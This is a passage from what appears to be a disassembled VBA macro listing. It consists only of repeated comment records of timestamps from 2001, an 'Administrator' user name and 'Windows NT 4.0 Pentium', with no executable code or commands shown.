' 	QuoteRem 0x0000 0x0011 "29.07.01 13:24:06"
' Line #919:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #920:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #921:
' Line #922:
' Line #923:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:25:40"
' Line #924:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #925:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #926:
' Line #927:
' Line #928:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:26:59"
' Line #929:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #930:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #931:
' Line #932:
' Line #933:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:30:06"
' Line #934:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #935:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #936:
' Line #937:
' Line #938:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:31:32"
' Line #939:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #940:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #941:
' Line #942:
' Line #943:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:33:27"
' Line #944:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #945:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #946:
' Line #947:
' Line #948:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:35:56"
' Line #949:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #950:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #951:
' Line #952:
' Line #953:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:37:50"
' Line #954:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #955:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #956:
' Line #957:
' Line #958:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:40:36"
' Line #959:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #960:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #961:
' Line #962:
' Line #963:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:42:21"
' Line #964:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #965:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #966:
' Line #967:
' Line #968:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:43:17"
' Line #969:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #970:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #971:
' Line #972:
' Line #973:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:44:03"
' Line #974:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #975:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #976:
' Line #977:
' Line #978:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:46:17"
' Line #979:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #980:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #981:
' Line #982:
' Line #983:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:48:55"
' Line #984:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #985:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #986:
' Line #987:
' Line #988:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:50:11"
' Line #989:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #990:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #991:
' Line #992:
' Line #993:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:50:35"
' Line #994:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #995:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #996:
' Line #997:
' Line #998:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:52:06"
' Line #999:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1000:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1001:
' Line #1002:
' Line #1003:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:52:58"
' Line #1004:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1005:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1006:
' Line #1007:
' Line #1008:
' 	QuoteRem 0x0000 0x0011 "29.07.01 13:53:28"
' Line #1009:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1010:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1011:
' Line #1012:
' Line #1013:
' 	QuoteRem 0x0000 0x0010 "30.07.01 9:38:51"
' Line #1014:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1015:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1016:
' Line #1017:
' Line #1018:
' 	QuoteRem 0x0000 0x0011 "30.07.01 11:45:46"
' Line #1019:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1020:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1021:
' Line #1022:
' Line #1023:
' 	QuoteRem 0x0000 0x0011 "30.07.01 13:36:30"
' Line #1024:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1025:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1026:
' Line #1027:
' Line #1028:
' 	QuoteRem 0x0000 0x0010 "31.07.01 7:27:41"
' Line #1029:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1030:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1031:
' Line #1032:
' Line #1033:
' 	QuoteRem 0x0000 0x0011 "31.07.01 10:13:14"
' Line #1034:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1035:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1036:
' Line #1037:
' Line #1038:
' 	QuoteRem 0x0000 0x0010 "01.08.01 9:53:22"
' Line #1039:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1040:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1041:
' Line #1042:
' Line #1043:
' 	QuoteRem 0x0000 0x0011 "01.08.01 10:03:16"
' Line #1044:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1045:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1046:
' Line #1047:
' Line #1048:
' 	QuoteRem 0x0000 0x0011 "31.07.01 11:05:56"
' Line #1049:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1050:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1051:
' Line #1052:
' Line #1053:
' 	QuoteRem 0x0000 0x0011 "31.07.01 11:06:14"
' Line #1054:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1055:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1056:
' Line #1057:
' Line #1058:
' 	QuoteRem 0x0000 0x0011 "31.07.01 11:06:26"
' Line #1059:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1060:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1061:
' Line #1062:
' Line #1063:
' 	QuoteRem 0x0000 0x0011 "31.07.01 11:15:10"
' Line #1064:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1065:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1066:
' Line #1067:
' Line #1068:
' 	QuoteRem 0x0000 0x0011 "31.07.01 11:15:29"
' Line #1069:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1070:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1071:
' Line #1072:
' Line #1073:
' 	QuoteRem 0x0000 0x0011 "31.07.01 11:59:44"
' Line #1074:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1075:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1076:
' Line #1077:
' Line #1078:
' 	QuoteRem 0x0000 0x0011 "31.07.01 12:01:36"
' Line #1079:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1080:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1081:
' Line #1082:
' Line #1083:
' 	QuoteRem 0x0000 0x0011 "31.07.01 12:02:03"
' Line #1084:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1085:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1086:
' Line #1087:
' Line #1088:
' 	QuoteRem 0x0000 0x0011 "31.07.01 14:14:53"
' Line #1089:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1090:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1091:
' Line #1092:
' Line #1093:
' 	QuoteRem 0x0000 0x0011 "31.07.01 18:52:30"
' Line #1094:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1095:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1096:
' Line #1097:
' Line #1098:
' 	QuoteRem 0x0000 0x0011 "31.07.01 18:52:32"
' Line #1099:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1100:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1101:
' Line #1102:
' Line #1103:
' 	QuoteRem 0x0000 0x0011 "01.08.01 19:32:01"
' Line #1104:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1105:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1106:
' Line #1107:
' Line #1108:
' 	QuoteRem 0x0000 0x0011 "02.08.01 17:12:17"
' Line #1109:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1110:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1111:
' Line #1112:
' Line #1113:
' 	QuoteRem 0x0000 0x0011 "05.08.01 12:31:04"
' Line #1114:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1115:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1116:
' Line #1117:
' Line #1118:
' 	QuoteRem 0x0000 0x0011 "06.08.01 18:34:19"
' Line #1119:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1120:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1121:
' Line #1122:
' Line #1123:
' 	QuoteRem 0x0000 0x0011 "06.08.01 18:35:20"
' Line #1124:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1125:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1126:
' Line #1127:
' Line #1128:
' 	QuoteRem 0x0000 0x0011 "06.08.01 18:35:22"
' Line #1129:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1130:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1131:
' Line #1132:
' Line #1133:
' 	QuoteRem 0x0000 0x0011 "08.08.01 16:16:25"
' Line #1134:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1135:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1136:
' Line #1137:
' Line #1138:
' 	QuoteRem 0x0000 0x0011 "08.08.01 16:17:15"
' Line #1139:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1140:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1141:
' Line #1142:
' Line #1143:
' 	QuoteRem 0x0000 0x0011 "08.08.01 16:17:29"
' Line #1144:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1145:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1146:
' Line #1147:
' Line #1148:
' 	QuoteRem 0x0000 0x0011 "08.08.01 16:22:15"
' Line #1149:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1150:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1151:
' Line #1152:
' Line #1153:
' 	QuoteRem 0x0000 0x0011 "08.08.01 16:25:38"
' Line #1154:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1155:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1156:
' Line #1157:
' Line #1158:
' 	QuoteRem 0x0000 0x0011 "08.08.01 18:33:53"
' Line #1159:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1160:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1161:
' Line #1162:
' Line #1163:
' 	QuoteRem 0x0000 0x0011 "08.08.01 18:35:54"
' Line #1164:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1165:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1166:
' Line #1167:
' Line #1168:
' 	QuoteRem 0x0000 0x0011 "08.08.01 18:45:19"
' Line #1169:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1170:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1171:
' Line #1172:
' Line #1173:
' 	QuoteRem 0x0000 0x0011 "08.08.01 18:45:32"
' Line #1174:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1175:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1176:
' Line #1177:
' Line #1178:
' 	QuoteRem 0x0000 0x0011 "08.08.01 18:46:03"
' Line #1179:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1180:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1181:
' Line #1182:
' Line #1183:
' 	QuoteRem 0x0000 0x0011 "08.08.01 19:01:19"
' Line #1184:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1185:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1186:
' Line #1187:
' Line #1188:
' 	QuoteRem 0x0000 0x0011 "08.08.01 19:01:35"
' Line #1189:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1190:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1191:
' Line #1192:
' Line #1193:
' 	QuoteRem 0x0000 0x0011 "09.08.01 10:28:26"
' Line #1194:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1195:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1196:
' Line #1197:
' Line #1198:
' 	QuoteRem 0x0000 0x0011 "09.08.01 11:09:09"
' Line #1199:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1200:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1201:
' Line #1202:
' Line #1203:
' 	QuoteRem 0x0000 0x0011 "09.08.01 14:08:57"
' Line #1204:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1205:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1206:
' Line #1207:
' Line #1208:
' 	QuoteRem 0x0000 0x0011 "09.08.01 16:12:50"
' Line #1209:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1210:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1211:
' Line #1212:
' Line #1213:
' 	QuoteRem 0x0000 0x0011 "09.08.01 16:13:57"
' Line #1214:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1215:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1216:
' Line #1217:
' Line #1218:
' 	QuoteRem 0x0000 0x0011 "09.08.01 16:17:08"
' Line #1219:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1220:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1221:
' Line #1222:
' Line #1223:
' 	QuoteRem 0x0000 0x0011 "11.08.01 15:16:28"
' Line #1224:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1225:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1226:
' Line #1227:
' Line #1228:
' 	QuoteRem 0x0000 0x0010 "12.08.01 9:10:13"
' Line #1229:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1230:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1231:
' Line #1232:
' Line #1233:
' 	QuoteRem 0x0000 0x0011 "13.08.01 12:15:11"
' Line #1234:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1235:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1236:
' Line #1237:
' Line #1238:
' 	QuoteRem 0x0000 0x0011 "14.08.01 10:14:18"
' Line #1239:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1240:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1241:
' Line #1242:
' Line #1243:
' 	QuoteRem 0x0000 0x0011 "15.08.01 12:28:18"
' Line #1244:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1245:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1246:
' Line #1247:
' Line #1248:
' 	QuoteRem 0x0000 0x0011 "15.08.01 14:39:13"
' Line #1249:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1250:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1251:
' Line #1252:
' Line #1253:
' 	QuoteRem 0x0000 0x0011 "25.08.01 13:25:30"
' Line #1254:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1255:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1256:
' Line #1257:
' Line #1258:
' 	QuoteRem 0x0000 0x0011 "25.08.01 13:27:51"
' Line #1259:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1260:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1261:
' Line #1262:
' Line #1263:
' 	QuoteRem 0x0000 0x0011 "25.08.01 17:05:32"
' Line #1264:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1265:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1266:
' Line #1267:
' Line #1268:
' 	QuoteRem 0x0000 0x0011 "25.08.01 17:06:46"
' Line #1269:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1270:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1271:
' Line #1272:
' Line #1273:
' 	QuoteRem 0x0000 0x0011 "25.08.01 17:07:10"
' Line #1274:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1275:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1276:
' Line #1277:
' Line #1278:
' 	QuoteRem 0x0000 0x0011 "25.08.01 17:08:38"
' Line #1279:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1280:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1281:
' Line #1282:
' Line #1283:
' 	QuoteRem 0x0000 0x0010 "29.08.01 9:19:53"
' Line #1284:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1285:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1286:
' Line #1287:
' Line #1288:
' 	QuoteRem 0x0000 0x0011 "31.08.01 14:51:40"
' Line #1289:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1290:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1291:
' Line #1292:
' Line #1293:
' 	QuoteRem 0x0000 0x0011 "01.09.01 11:54:22"
' Line #1294:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1295:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1296:
' Line #1297:
' Line #1298:
' 	QuoteRem 0x0000 0x0011 "01.09.01 14:21:45"
' Line #1299:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1300:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1301:
' Line #1302:
' Line #1303:
' 	QuoteRem 0x0000 0x0011 "01.09.01 14:23:42"
' Line #1304:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1305:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1306:
' Line #1307:
' Line #1308:
' 	QuoteRem 0x0000 0x0011 "03.09.01 10:52:52"
' Line #1309:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1310:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1311:
' Line #1312:
' Line #1313:
' 	QuoteRem 0x0000 0x0010 "07.09.01 7:55:21"
' Line #1314:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1315:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1316:
' Line #1317:
' Line #1318:
' 	QuoteRem 0x0000 0x0011 "07.09.01 14:59:35"
' Line #1319:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1320:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1321:
' Line #1322:
' Line #1323:
' 	QuoteRem 0x0000 0x0010 "09.09.01 8:29:58"
' Line #1324:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1325:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1326:
' Line #1327:
' Line #1328:
' 	QuoteRem 0x0000 0x0010 "09.09.01 9:47:49"
' Line #1329:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1330:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1331:
' Line #1332:
' Line #1333:
' 	QuoteRem 0x0000 0x0010 "10.09.01 7:20:01"
' Line #1334:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1335:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1336:
' Line #1337:
' Line #1338:
' 	QuoteRem 0x0000 0x0010 "10.09.01 7:46:33"
' Line #1339:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1340:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1341:
' Line #1342:
' Line #1343:
' 	QuoteRem 0x0000 0x0010 "10.09.01 7:47:12"
' Line #1344:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1345:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1346:
' Line #1347:
' Line #1348:
' 	QuoteRem 0x0000 0x0010 "10.09.01 9:04:53"
' Line #1349:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1350:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1351:
' Line #1352:
' Line #1353:
' 	QuoteRem 0x0000 0x0010 "10.09.01 9:08:06"
' Line #1354:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1355:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1356:
' Line #1357:
' Line #1358:
' 	QuoteRem 0x0000 0x0010 "10.09.01 9:10:17"
' Line #1359:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1360:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1361:
' Line #1362:
' Line #1363:
' 	QuoteRem 0x0000 0x0010 "10.09.01 9:10:48"
' Line #1364:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1365:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1366:
' Line #1367:
' Line #1368:
' 	QuoteRem 0x0000 0x0010 "10.09.01 9:14:42"
' Line #1369:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1370:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1371:
' Line #1372:
' Line #1373:
' 	QuoteRem 0x0000 0x0011 "10.09.01 10:33:31"
' Line #1374:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1375:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1376:
' Line #1377:
' Line #1378:
' 	QuoteRem 0x0000 0x0011 "10.09.01 12:16:48"
' Line #1379:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #1380:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1381:
' Line #1382:
' Line #1383:
' 	QuoteRem 0x0000 0x0013 "10/23/01 3:18:31 PM"
' Line #1384:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1385:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1386:
' Line #1387:
' Line #1388:
' 	QuoteRem 0x0000 0x0013 "10/23/01 4:46:15 PM"
' Line #1389:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1390:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1391:
' Line #1392:
' Line #1393:
' 	QuoteRem 0x0000 0x0013 "10/23/01 4:46:35 PM"
' Line #1394:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1395:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1396:
' Line #1397:
' Line #1398:
' 	QuoteRem 0x0000 0x0014 "10/25/01 11:37:38 AM"
' Line #1399:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1400:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1401:
' Line #1402:
' Line #1403:
' 	QuoteRem 0x0000 0x0014 "10/25/01 11:54:13 AM"
' Line #1404:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1405:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1406:
' Line #1407:
' Line #1408:
' 	QuoteRem 0x0000 0x0014 "10/25/01 11:55:45 AM"
' Line #1409:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1410:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1411:
' Line #1412:
' Line #1413:
' 	QuoteRem 0x0000 0x0014 "10/25/01 12:18:50 PM"
' Line #1414:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1415:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1416:
' Line #1417:
' Line #1418:
' 	QuoteRem 0x0000 0x0013 "10/27/01 2:31:28 PM"
' Line #1419:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1420:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1421:
' Line #1422:
' Line #1423:
' 	QuoteRem 0x0000 0x0013 "10/27/01 2:32:29 PM"
' Line #1424:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1425:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1426:
' Line #1427:
' Line #1428:
' 	QuoteRem 0x0000 0x0013 "10/27/01 2:33:22 PM"
' Line #1429:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1430:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1431:
' Line #1432:
' Line #1433:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:01:50 PM"
' Line #1434:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1435:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1436:
' Line #1437:
' Line #1438:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:04:24 PM"
' Line #1439:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1440:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1441:
' Line #1442:
' Line #1443:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:11:53 PM"
' Line #1444:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1445:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1446:
' Line #1447:
' Line #1448:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:14:07 PM"
' Line #1449:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1450:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1451:
' Line #1452:
' Line #1453:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:16:24 PM"
' Line #1454:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1455:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1456:
' Line #1457:
' Line #1458:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:19:29 PM"
' Line #1459:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1460:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #1461:
' Line #1462:
' Line #1463:
' 	QuoteRem 0x0000 0x0013 "10/27/01 3:20:49 PM"
' Line #1464:
' 	QuoteRem 0x0000 0x0007 "Adminis"
' Line #1465:
